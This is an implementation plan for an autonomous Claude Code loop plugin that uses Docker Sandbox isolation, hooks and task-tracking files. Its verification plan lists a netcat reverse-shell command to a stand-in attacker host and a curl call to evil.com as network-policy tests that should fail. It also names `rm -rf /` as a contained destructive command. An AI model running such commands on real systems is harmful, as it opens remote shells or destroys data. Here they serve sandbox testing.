# Ralph Loop Development Workflow — Implementation Plan

## Context

The Ralph Loop is an outer orchestration pattern that repeatedly invokes Claude Code CLI against file-based specifications. Each iteration gets a fresh context window, avoiding context rot. State persists on disk between iterations via progress files, task lists, and memory files. A bash script drives the loop.

This plan builds a **standalone `ralph` plugin** under `claude-code/plugins/ralph/`, separate from the `zaksak` plugin. This keeps the ralph workflow self-contained and independently installable via the marketplace. The design draws from the synthesized research in `research/ralph-loops/`. Key differentiators from reference implementations: **Docker Sandbox microVM isolation** as the primary safety mechanism (with a PreToolUse hook blocklist as fallback), explicit separation of loop-scoped vs repo-scoped memory, context-aware wrap-up guidance, and self-managing task iteration.

### Prerequisites

- **Claude Code CLI** installed on host
- **Docker Desktop 4.58+** with Sandboxes enabled (recommended for primary safety mode)
- `jq` (for task list verification in `ralph.sh`)
- macOS with Apple Silicon (primary target); Windows experimental, Linux legacy container mode
- If Docker is unavailable, the plugin falls back to a PreToolUse hook blocklist (see `pretooluse-hook-reference.md`)

---

## File Layout

New plugin at `claude-code/plugins/ralph/`:

```
claude-code/plugins/ralph/
├── .claude-plugin/
│   └── plugin.json                          # NEW: plugin manifest
├── hooks/
│   ├── hooks.json                           # NEW: plugin hook definitions
│   └── scripts/
│       ├── context_monitor.py              # NEW: PostToolUse context usage alerts
│       └── stop_loop_reminder.py            # NEW: Stop hook — tasks.json validation + enforce commit
├── sandbox/
│   └── setup.sh                             # NEW: auth symlink setup (run via `docker sandbox exec`)
├── scripts/
│   ├── ralph.sh                             # NEW: main loop runner (sandbox-aware)
│   ├── ralph-init.sh                        # NEW: initialize a ralph loop in a project
│   └── ralph-archive.sh                     # NEW: archive a completed loop
├── skills/
│   └── ralph-plan.md                        # NEW: interactive PRD + task list generation skill
└── templates/
    ├── prompt.md                            # NEW: per-iteration prompt template
    ├── prd-template.md                      # NEW: PRD scaffold (requirements context)
    ├── tasks-template.json                  # NEW: task list starter (execution state)
    └── progress-template.md                 # NEW: progress log starter
```

Also update the root `marketplace.json` to register the new plugin.

When a user runs `ralph-init.sh` in their target project, it creates:

```
target-project/
├── ralph/
│   ├── prd.md            # Requirements context (human-written, static during loop)
│   ├── tasks.json        # Task list / execution state (Claude-modified)
│   ├── progress.txt      # Append-only iteration log (loop-scoped memory)
│   └── prompt.md         # Iteration prompt (copied, customizable per-project)
└── .ralph-active          # Runtime marker (created by ralph.sh, gitignored)
```

---

## Components

### 1. Plugin Manifest

**File:** `claude-code/plugins/ralph/.claude-plugin/plugin.json`

```json
{
  "name": "ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with sandbox isolation, scoped memory, and self-managing task iteration",
  "version": "0.1.0",
  "hooks": "./hooks/hooks.json"
}
```

### 2. Marketplace Registration

**File:** `marketplace.json` (root) — add entry:

```json
{
  "name": "ralph",
  "source": "./claude-code/plugins/ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with sandbox isolation, scoped memory, and self-managing task iteration",
  "version": "0.1.0"
}
```

### 3. ralph.sh — Main Loop Runner

**File:** `claude-code/plugins/ralph/scripts/ralph.sh`

Core behavior:
- Iterates from 1 to `MAX_ITERATIONS` (default: 10), invoking Claude each time with the prompt template
- **Sandbox mode (default):** Uses the create + exec + run pattern (see below). The sandbox provides OS-level isolation; `--dangerously-skip-permissions` is applied by the sandbox template automatically
- **Direct mode (fallback):** Uses `claude -p "$PROMPT" --dangerously-skip-permissions` — relies on PreToolUse hook blocklist for safety (see `pretooluse-hook-reference.md`)
- Auto-detects Docker Sandbox availability at startup; falls back to direct mode if unavailable
- Each iteration is a fresh `claude -p` process = fresh context window (the sandbox itself persists across iterations — fast reconnect, no re-setup)
- Uses `sed` to inject `$RALPH_ITERATION` and `$RALPH_MAX_ITERATIONS` into the prompt before passing to Claude
- Creates `.ralph-active` marker file on start (JSON with timestamp, pid, max_iterations, mode) — hooks check for this file to activate ralph-specific behavior
- Registers `trap` to clean up `.ralph-active` on EXIT/INT/TERM
- Detects completion via `<promise>COMPLETE</promise>` in output, then verifies with `jq` that all stories in `tasks.json` have `passes: true`
- Falls back to tasks.json-only check (if agent completed everything but forgot the tag)
- Streams output to terminal via `tee /dev/stderr` while capturing for promise detection
- In sandbox mode, adds a 2-3 second sleep between iterations to allow sandbox→host file sync to settle before reading `tasks.json` on the host
- Handles transient empty responses (exit 0 with no text output) by retrying the iteration, with a cap on retries
- Exits 0 on completion, 1 on max iterations reached

Sandbox invocation pattern (create + exec + run):

```bash
SANDBOX_NAME="ralph-$(echo "$PROJECT_DIR" | sed 's#[^A-Za-z0-9._-]#_#g')"

# One-time setup: create sandbox if it doesn't exist
if ! docker sandbox ls 2>/dev/null | grep -q "$SANDBOX_NAME"; then
  # Create with default claude-code template + auth state mount
  docker sandbox create --name "$SANDBOX_NAME" claude "$PROJECT_DIR" "$HOME/.dclaude_state"

  # Set up auth symlinks and git config inside the sandbox
  docker sandbox exec -u root "$SANDBOX_NAME" bash -c '
    STATE_DIR="/Users/'"$USER"'/.dclaude_state"
    rm -rf /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
    ln -s "$STATE_DIR/.claude" /home/agent/.claude
    ln -s "$STATE_DIR/.claude.json" /home/agent/.claude.json
    chown -h agent:agent /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
  '
  docker sandbox exec "$SANDBOX_NAME" bash -c '
    git config --global user.email "ralph@localhost"
    git config --global user.name "Ralph Loop"
  '
fi

# Every iteration
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

**Why create + exec + run instead of a custom Dockerfile template:** Docker Sandbox VMs have a separate image store from the host Docker daemon. Locally-built images (`docker build -t dclaude:latest`) are not accessible to the sandbox VM — `--pull-template never` does not help. The `exec` approach uses the stock `docker/sandbox-templates:claude-code` image (pulled from Docker Hub) and customizes the live VM. See `sandbox-test-results.md` Step 6 for full details.

**File sync constraint:** Once Mutagen has synced a file into the sandbox, host-side overwrites of that file are permanently ignored. This does not affect the default loop (sandbox writes files, host only reads), but matters for manual intervention. `ralph.sh` handles two scenarios:

1. **Resume after pause (developer edited files on host):** `ralph.sh` detects the pause and runs `docker sandbox stop` + restart before the next iteration. This forces Mutagen to re-snapshot the host filesystem, picking up all edits made in VS Code or any editor. Overhead is ~10s (one-time per resume). The developer workflow is: pause → edit files normally → resume. No special tooling required. See `docker-sandbox-isolation.md` "File sync" caveat for the full pattern.

2. **Programmatic host→sandbox writes (feedback injection between iterations):** Use `docker sandbox exec` to write directly into the sandbox, bypassing the sync layer entirely.

See `sandbox-test-results.md` Step 4 for the full root cause analysis, follow-up tests, and workaround matrix.

Arguments:
```
ralph.sh [OPTIONS]
  -n, --max-iterations N    Max loop iterations (default: 10)
  --ralph-dir PATH           Path to ralph/ directory (default: ./ralph)
  -d, --project-dir PATH    Project root (default: cwd)
  -m, --model MODEL         Claude model to use (e.g., opus, sonnet)
  --sandbox                  Force Docker Sandbox mode (error if unavailable)
  --no-sandbox               Force direct mode with PreToolUse hook blocklist
  -h, --help                Show usage
```

Dependencies: `jq` (for tasks.json verification), `claude` CLI. Docker Desktop 4.58+ recommended for sandbox mode.

### 4. Safety Isolation — Docker Sandbox

**Primary safety mechanism.** Instead of a PreToolUse hook that pattern-matches dangerous commands (bypassable via encoding, variable expansion, subshells), Ralph runs Claude inside a Docker Sandbox microVM that provides hypervisor-level isolation. Even `rm -rf /` only destroys the sandbox filesystem. Network exfiltration is blocked by the sandbox's built-in proxy with domain allowlisting.

See `docker-sandbox-isolation.md` for full setup, architecture diagram, network policy configuration, and known caveats.

**Sandbox setup:**

- **`sandbox/setup.sh`** — Shell script that sets up auth symlinks and git config inside the sandbox VM. Run once via `docker sandbox exec -u root` after `docker sandbox create`. Symlinks `~/.dclaude_state/.claude/` into the sandbox `agent` user's home so credentials persist across sandbox destruction and recreation without mounting `~/.claude` directly.

**Note:** The original plan used a custom Dockerfile template (`sandbox/Dockerfile` + `sandbox/entrypoint.sh`). Feasibility testing found that Docker Sandbox VMs cannot access locally-built images — the `--pull-template never -t dclaude:latest` approach fails with "pull access denied". The working approach is to use the stock `docker/sandbox-templates:claude-code` template and customize via `docker sandbox exec`. See `sandbox-test-results.md` Step 6.

**Auth state initialization:** `~/.dclaude_state/.claude.json` must contain valid JSON (`{}` minimum). Using `touch` to create an empty file causes JSON parse errors on sandbox startup. Use `echo '{}' > ~/.dclaude_state/.claude.json`.

**Fallback:** When Docker Sandbox is unavailable (no Docker Desktop, Linux CI, etc.), `ralph.sh` runs Claude directly with `--dangerously-skip-permissions` and relies on a PreToolUse hook blocklist for safety. The hook script and full pattern reference are documented in `pretooluse-hook-reference.md`.

### 5. Hook Scripts

**File:** `claude-code/plugins/ralph/hooks/hooks.json`

Wires two hooks across two events (PostToolUse, Stop), plus a SessionStart cleanup. All hook scripts are written in Python for consistency, robust JSON handling (no `jq` dependency), and cleaner tasks.json validation logic. These hooks run inside the Docker Sandbox when sandbox mode is active.

#### 5a. Context Monitor (Always-on, graduated alerts)

**File:** `hooks/scripts/context_monitor.py`
**Event:** `PostToolUse`, matcher: `.*`
**Always active** — fires after every tool call

Estimates context usage by parsing the session transcript file (available via `transcript_path` in hook stdin JSON). Uses a `FILE_SIZE / 4` chars-per-token heuristic against a 200k token window (configurable via `CLAUDE_CONTEXT_WINDOW` env var).

Fires graduated alerts at 5 thresholds — each threshold triggers only once per session:

| Threshold | Severity | Message                                                                                        |
| --------- | -------- | ---------------------------------------------------------------------------------------------- |
| 50%, 60%  | NOTICE   | "Be mindful of remaining space. Plan to finish your current task within this session. If you discover follow-up work, add new stories to tasks.json — the next iteration will pick them up." |
| 70%, 80%  | WARNING  | "Finish your current task and commit soon. Do not start additional tasks. If work remains, create new stories in tasks.json for the next iteration and capture any implementation details or insights in progress.txt so the next iteration has full context." |
| 90%       | CRITICAL | "Wrap up immediately. Do NOT start new work. Instead: (1) create tasks in tasks.json for any remaining work, (2) write implementation details, insights, and handoff notes to progress.txt, (3) commit all changes, (4) stop. The next iteration will continue from where you left off." |

**State tracking:** Uses `/tmp/claude-context-alerts-${SESSION_ID}` to record which thresholds have already fired. Each threshold fires once, then is suppressed for the rest of the session.

**Session cleanup:** A `SessionStart` hook (inline command in hooks.json) removes the state file at the start of each new session so thresholds re-arm.

**Output:** Returns JSON with `hookSpecificOutput.additionalContext` containing the alert message, which gets injected into Claude's context.

**Tuning:** If alerts fire too early, increase the chars-per-token divisor to 5–6. If too late, decrease to 3. After compaction the transcript file is not truncated, so estimates may run high post-compaction — this is conservative (alerts earlier, not later).

#### 5b. End-of-Loop Stop Reminder (Ralph-only)

**File:** `hooks/scripts/stop_loop_reminder.py`
**Event:** `Stop`
**Conditionally active:** only when `.ralph-active` exists

Runs two checks before allowing Claude to stop. Both must pass or the stop is blocked:

**Check 1: Task list schema validation** — Validates `ralph/tasks.json` structure:
- File exists and is valid JSON
- Required top-level fields: `project`, `branchName`, `description`, `userStories` (array)
- Every story has required fields: `id` (string), `title` (string), `passes` (boolean), `priority` (number), `acceptanceCriteria` (non-empty array)
- `id` values are unique (no duplicates)
- No story has `passes: true` with an empty `notes` field (enforce documentation of what was done)
- If validation fails → block with specific error describing which field/story is malformed

**Check 2: Uncommitted changes** — Checks `git status --porcelain`:
- If uncommitted changes exist → block, telling Claude to:
  1. Update `ralph/progress.txt` with what was accomplished + learnings
  2. Consider if any lasting patterns belong in CLAUDE.md or `.claude/rules/`
  3. Commit ALL changes including progress.txt and tasks.json updates
- Claude must address the feedback and try stopping again

If both checks pass (valid task list + no uncommitted changes), approves the stop.

### 6. Prompt Template

**File:** `claude-code/plugins/ralph/templates/prompt.md`

The prompt Claude receives each iteration. Structure:

1. **Header** — Identifies this as Ralph Loop iteration N of M
2. **Step 1: Orient** — Read progress.txt (especially Codebase Patterns section at top), read prd.md for requirements context, read tasks.json for task state, check `git log` and `git status`
3. **Step 2: Select & Right-Size** — Pick highest-priority story where `passes: false` (respecting `dependsOn`). If too large for the context window (~60% of context is usable working space), break it into sub-stories in tasks.json and work on the first one. Claude can also add new tasks, reorder priorities, or restructure the task list as needed.
4. **Step 3: Implement** — Read existing code first, follow patterns, implement one story, run project verification commands (from `tasks.json.verifyCommands`). Respect constraints from prd.md throughout.
5. **Step 4: Document Progress** — Append structured entry to progress.txt (what was done, files changed, verification results, learnings). Curate the Codebase Patterns section at the top with reusable discoveries
6. **Step 5: Consider Memory Updates** — Update CLAUDE.md or `.claude/rules/` ONLY for rules that persist beyond this ralph loop (e.g., "this project uses bun not npm"). Skip this step if nothing universal was learned
7. **Step 6: Commit & Signal** — Set `passes: true` in tasks.json, commit with `feat: [US-xxx] - [Title]`, check if ALL stories complete → output `<promise>COMPLETE</promise>`

Hard rules embedded in the prompt:
- One story per iteration, never start a second
- Don't mark `passes: true` until verification passes
- Don't weaken tests to make them pass
- If stuck, document the blocker in progress.txt for the next iteration
- Claude may add/split/reorder stories in tasks.json as needed (self-management)
- prd.md is read-only — never modify the PRD during the loop

### 7. PRD Template

**File:** `claude-code/plugins/ralph/templates/prd-template.md`

The human-written requirements document that Claude reads each iteration for context. Adapted from the project's `docs/PRD_TEMPLATE.md`, stripped of execution-tracking sections (those live in tasks.json). Static during the loop — Claude reads but never modifies this file.

Sections (annotated with complexity tiers from S-Patch to L-Epic):

1. **Summary** _(Required, all tiers)_ — 2-4 sentences: what is being built, who it's for, expected outcome
2. **Problem Statement** _(Required, all tiers)_ — Current state, why it's a problem, what triggers this work
3. **Goals** _(Required M/L, Optional S)_ — 3-6 specific, measurable outcomes
4. **Non-Goals** _(Required M/L, Recommended S)_ — Explicit scope boundaries. The most important section for AI agents — prevents over-engineering and unrequested changes
5. **Background & Context** _(Recommended M/L)_ — Architecture overview, key file paths, existing patterns to follow, database schema context, terminology
6. **Technical Design** _(Required, all tiers)_ — Subsections as needed:
   - 6a. Database Changes (DDL, indexes, RLS)
   - 6b. API Contracts (method, path, request/response JSON, errors)
   - 6c. Core Logic Changes (pseudocode, step-by-step algorithms)
   - 6d. Frontend Changes (components, data flow, interaction flow)
   - 6e. Infrastructure / Config Changes
7. **Constraints** _(Recommended M/L)_ — Cross-cutting invariants that apply to ALL stories across every iteration. Rules Claude must respect regardless of which task is active:
   - Technical constraints ("All monetary values stored as NUMERIC(10,2), never floats")
   - Library/pattern mandates ("Use spatie/laravel-enum, not native PHP enums")
   - Integration rules ("All new endpoints must be idempotent")
   - Behavioral invariants ("Custom prices always take precedence over default prices")
8. **Edge Cases & Error Handling** _(Recommended M/L)_ — Scenario / Trigger / Expected Behavior / Error table
9. **Risks & Mitigations** _(Recommended M/L)_ — Risk / Likelihood / Impact / Mitigation table
10. **Open Questions** _(Recommended, all tiers)_ — Unresolved decisions; strikethrough + annotate when resolved

Template provides section headers with HTML comments explaining what to write. User deletes sections they don't need.

### 8. Tasks Template

**File:** `claude-code/plugins/ralph/templates/tasks-template.json`

The machine-readable execution state tracker. Claude reads and modifies this file each iteration to track story completion.

```json
{
  "project": "",
  "branchName": "ralph/feature-name",
  "description": "",
  "verifyCommands": [],
  "userStories": [
    {
      "id": "US-001",
      "title": "",
      "description": "",
      "acceptanceCriteria": [],
      "priority": 1,
      "passes": false,
      "notes": "",
      "dependsOn": []
    }
  ]
}
```

Key fields:
- `verifyCommands`: project-specific checks Claude runs each iteration (tests, lint, typecheck)
- `dependsOn`: ordering constraints between stories
- `passes`: boolean, toggled by Claude when acceptance criteria + verification pass
- `notes`: Claude appends implementation context for future iterations

**Separation of concerns:** prd.md provides the *context* (what, why, constraints, technical design). tasks.json provides the *execution state* (stories, completion, priority). The PRD is the specification; the task list is the checklist.

### 9. Progress Template

**File:** `claude-code/plugins/ralph/templates/progress-template.md`

```markdown
# Ralph Progress Log
Started: {{DATE}}
PRD: {{PROJECT_NAME}}

## Codebase Patterns
- (Reusable patterns discovered during this loop)

---
```

Append-only after the `---`. The Codebase Patterns section at the top is curated (edited, not just appended) as the loop progresses.

### 10. Utility Scripts

#### ralph-init.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-init.sh`

Usage: `ralph-init.sh [--project-dir PATH] [--name FEATURE_NAME]`

What it does:
1. Creates `ralph/` directory in the target project
2. Copies template files (prompt.md, prd-template.md → prd.md, tasks-template.json → tasks.json, progress-template.md → progress.txt)
3. Substitutes `{{DATE}}` and `{{PROJECT_NAME}}` in progress.txt
4. Sets `branchName` in tasks.json to `ralph/<name>` if `--name` provided
5. Adds `.ralph-active` to `.gitignore` if not already there
6. Prints next-steps instructions

#### ralph-archive.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-archive.sh`

Usage: `ralph-archive.sh [--project-dir PATH] [--label LABEL]`

What it does:
1. Creates `ralph-archive/<date>-<branch-or-label>/`
2. Moves prd.md, tasks.json, and progress.txt to archive
3. Generates a `summary.md` (stories completed vs total, date range)
4. Resets `ralph/` to clean state with fresh templates
5. Commits the archive

### 11. ralph-plan Skill

**File:** `claude-code/plugins/ralph/skills/ralph-plan.md`

A user-invocable skill (`/ralph-plan`) that interactively generates `prd.md` and `tasks.json`. Adapts based on whether `ralph/prd.md` already has content.

**Mode 1 — Full planning** (prd.md is empty or template scaffold):
1. Ask the user clarifying questions — as many as needed until the requirements are clear. No fixed limit. Focus on: problem/goal, core functionality, scope boundaries, technical context, constraints, success criteria. Continue asking until confident the specification is complete.
2. Generate `ralph/prd.md` with all relevant sections filled in (following the PRD template structure)
3. Derive `ralph/tasks.json` — break requirements into right-sized stories (each completable in one iteration/context window), set dependency ordering via `dependsOn`, write verifiable acceptance criteria, include `verifyCommands`
4. Present both files for user review

**Mode 2 — Task derivation** (prd.md already has content):
1. Read existing `ralph/prd.md`
2. Ask targeted questions only if requirements are ambiguous or incomplete
3. Derive `ralph/tasks.json` from the specification
4. Present tasks for user review

**Task derivation rules** (applied in both modes):
- Each story must be completable in one ralph iteration (one context window). Rule of thumb: if you can't describe the change in 2-3 sentences, it's too big — split it
- Stories ordered by dependency: schema/database → backend logic → API routes → frontend components → integration/summary views
- Every story gets verifiable acceptance criteria (not vague — "Filter dropdown has options: All, Active, Done", not "works correctly")
- `dependsOn` set explicitly when story order matters beyond priority
- `verifyCommands` populated from the project's existing test/lint/typecheck commands

**Trigger phrases:** `/ralph-plan`, "plan this feature for ralph", "create a ralph prd", "generate tasks for ralph"

**Prerequisite:** `ralph/` directory must exist (run `ralph-init.sh` first). If it doesn't exist, the skill tells the user to run init first.

---

## Implementation Order

1. **Plugin scaffold** — `.claude-plugin/plugin.json` + `marketplace.json` update
2. **Templates** — `prd-template.md`, `tasks-template.json`, `progress-template.md`, `prompt.md` (static files, no deps)
3. **Sandbox setup script** — `sandbox/setup.sh` (auth symlinks + git config, run via `docker sandbox exec`; see `sandbox-test-results.md`)
4. **Hook scripts** — `context_monitor.py`, `stop_loop_reminder.py` (Python, standalone, testable independently)
5. **hooks.json** — Wire hooks to events (depends on hook scripts)
6. **ralph.sh** — Main loop runner with sandbox/direct mode detection (depends on templates + sandbox template)
7. **ralph-init.sh** — Initializer (depends on templates existing)
8. **ralph-archive.sh** — Archiver (depends on file layout)
9. **ralph-plan skill** — Interactive planner (depends on templates for PRD structure knowledge)

---

## Design Decisions

| Decision                  | Choice                                  | Rationale                                                                                                                                                                |
| ------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Plugin structure          | Standalone `ralph` plugin               | Self-contained, independently installable, doesn't bloat `zaksak`                                                                                                        |
| Safety isolation          | Docker Sandbox microVM (primary)        | OS-level isolation is structurally stronger than regex pattern matching; not bypassable from inside; network proxy blocks exfiltration without maintaining pattern lists |
| Safety fallback           | PreToolUse hook blocklist               | For environments without Docker Desktop; pattern reference in `pretooluse-hook-reference.md`                                                                             |
| Task list mutability      | Claude can modify                       | Enables self-management: splitting, adding, reordering tasks                                                                                                             |
| Permission mode           | `--dangerously-skip-permissions`        | Fully autonomous; sandbox isolation (or hook blocklist) provides the safety net                                                                                          |
| Context reminders         | PostToolUse transcript-size monitor     | Graduated alerts at 50/60/70/80/90% via chars-per-token heuristic on transcript file                                                                                     |
| Progress.txt format       | Append-only with curated top section    | Loop-scoped memory; patterns section is edited, entries are append-only                                                                                                  |
| Memory file separation    | progress.txt (loop) vs CLAUDE.md (repo) | Clear boundary: task state vs lasting conventions                                                                                                                        |
| PRD / task list separation | prd.md (context) + tasks.json (state)   | PRD is the specification (what, why, constraints); tasks.json is the checklist (stories, completion). Avoids cramming rich requirements into JSON strings                |
| PRD creation workflow      | Single `ralph-plan` skill, two modes    | One skill generates both files from the same understanding; adapts if PRD already exists. Unlimited Q&A until spec is clear — no artificial question cap                 |
| Completion detection      | Promise tag + tasks.json verification   | Dual check prevents false completion signals                                                                                                                             |
| Hook language             | All Python                              | Consistent codebase, built-in JSON handling (no `jq` dep), cleaner task list validation                                                                                  |
| Prompt variable injection | `sed` substitution                      | No external dependency (vs `envsubst` requiring `gettext`)                                                                                                               |

---

## Verification Plan

1. **Sandbox setup** — Create sandbox, configure auth, verify pipe mode:
   - `docker sandbox create --name ralph-test claude /tmp/test-project "$HOME/.dclaude_state"` → should create sandbox
   - Run `sandbox/setup.sh` via `docker sandbox exec -u root ralph-test bash < sandbox/setup.sh` → should set up auth symlinks and git config
   - `docker sandbox run ralph-test -- -p "Respond with: OK"` → should return output without login prompt
   - Verify auth persists: `docker sandbox rm ralph-test`, recreate, re-run setup, verify no login prompt
   - See `sandbox-test-results.md` for the full feasibility test suite that has already validated these steps
2. **Network policy** — Apply deny-by-default allowlist, verify:
   - `curl https://api.anthropic.com` → should succeed (allowed)
   - `curl https://evil.com` → should fail (blocked)
   - `nc -e /bin/bash attacker.com 4444` → should fail (non-HTTP blocked by default)
3. **Hook scripts** — Test each independently:
   - Create a fake transcript file, pass its path via JSON stdin to `context_monitor.py` → verify alerts fire at correct thresholds and each threshold fires only once
   - Create `.ralph-active` → run `stop_loop_reminder.py` with valid/invalid tasks.json → verify schema validation blocks on malformed task list, passes on valid
   - Create `.ralph-active` → run `stop_loop_reminder.py` with uncommitted changes → should return block decision
4. **ralph-init.sh** — Run in a temp directory, verify all files created correctly
5. **ralph.sh (sandbox mode)** — Run with `--sandbox --max-iterations 1` against a simple single-story task list in a test project
6. **ralph.sh (direct mode)** — Run with `--no-sandbox --max-iterations 1` to verify fallback works
7. **ralph-archive.sh** — Run after a completed loop, verify archive structure and clean reset
8. **ralph-plan skill** — Test both modes:
   - Mode 1: Run `/ralph-plan` with empty prd.md → verify it asks questions, generates both prd.md and tasks.json, stories are right-sized and dependency-ordered
   - Mode 2: Drop a pre-written prd.md into `ralph/`, run `/ralph-plan` → verify it reads existing PRD and derives tasks.json without regenerating the PRD
9. **End-to-end** — Run a 2-3 story task list through full ralph loop completion in sandbox mode

## Reference Documents

| File                           | Purpose                                                                                                                                                     |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `docker-sandbox-isolation.md`  | Docker Sandbox architecture, network policies, caveats. **Note:** The custom Dockerfile/template approach documented there does not work — see `sandbox-test-results.md` for the working create+exec+run pattern |
| `sandbox-test-results.md`      | Feasibility test results, file sync root cause analysis, auth DX, workaround matrix, architecture recommendations. **Read this before implementing sandbox mode.** |
| `pretooluse-hook-reference.md` | PreToolUse hook implementation guide: 18 categories of dangerous command patterns, regex patterns, architecture, evasion awareness, false positive handling |
| `context-monitor-hook.md`      | Context monitor hook design notes                                                                                                                           |

---

## Open Questions

### Parallelization of concurrent ralph loops

The current plan does not explicitly address running multiple ralph loops simultaneously. Analysis of shared resources:

**Cross-project** (Project A + Project B): Likely works out of the box. Sandbox names, `ralph/` directories, `.ralph-active` markers, and git repos are all namespaced by `$PROJECT_DIR`. Main concern is Docker Desktop resource limits — each sandbox VM consumes memory/CPU.

**Same-repo, different features**: Cannot work in a single worktree — git doesn't support concurrent branch work in one directory. Git worktrees would make each worktree a separate directory, so ralph would treat them as independent projects. Needs validation.

**Same-directory accidental double-start**: Two `ralph.sh` processes in the same directory would stomp on `ralph/` files, share a sandbox, and race on git commits. `.ralph-active` could serve as a PID-aware lock (check if stored PID is alive on startup, only delete on exit if PID matches `$$`), but this is not currently specified.

**To resolve before or during implementation:**
- Should `.ralph-active` act as a PID-aware lock to prevent same-directory double-start?
- Should the plan formally recommend git worktrees for same-repo parallel features?
- Are Docker resource considerations (multiple concurrent VMs) worth documenting in ralph.sh `--help` or init output?
